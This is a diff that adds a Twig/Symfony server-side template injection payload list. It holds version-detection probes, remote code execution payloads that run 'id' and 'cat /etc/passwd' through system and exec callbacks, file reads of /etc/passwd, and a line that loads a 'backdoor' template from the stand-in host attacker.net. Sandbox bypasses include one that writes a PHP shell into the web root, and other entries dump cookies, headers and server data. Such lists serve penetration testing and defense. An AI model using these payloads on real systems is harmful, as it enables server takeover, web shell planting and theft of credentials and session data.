@@ -1,0 +1,38 @@
+# Twig (PHP) - Symfony
+
+# Version detection
+{{_self}}
+{{_self.env}}
+{{dump(app)}}
+{{app.request.server.all|join(',')}}
+
+# Twig 1.x RCE
+{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
+{{_self.env.registerUndefinedFilterCallback("system")}}{{_self.env.getFilter("id")}}
+
+# Twig 2.x / 3.x RCE
+{{['id']|filter('system')}}
+{{['cat /etc/passwd']|filter('system')}}
+{{['id']|map('system')}}
+{{['id']|filter('exec')}}
+{{'id'|filter('system')}}
+
+# File read
+{{'/etc/passwd'|file_excerpt(1,-1)}}
+{{source('/etc/passwd')}}
+
+# Alternative RCE
+{{_self.env.setCache("ftp://attacker.net:21")}}{{_self.env.loadTemplate("backdoor")}}
+{{[0]|reduce('system','id')}}
+
+# Bypass sandbox
+{{["id"]|sort("system")}}
+{{["id"]|map("system")|join}}
+{{["id",0]|sort("system")|join}}
+{{{"<?php phpinfo();":"/var/www/html/shell.php"}|map("file_put_contents")}}
+
+# Information disclosure
+{{dump()}}
+{{dump(user)}}
+{{app.request.cookies.all}}
+{{app.request.headers.all}}
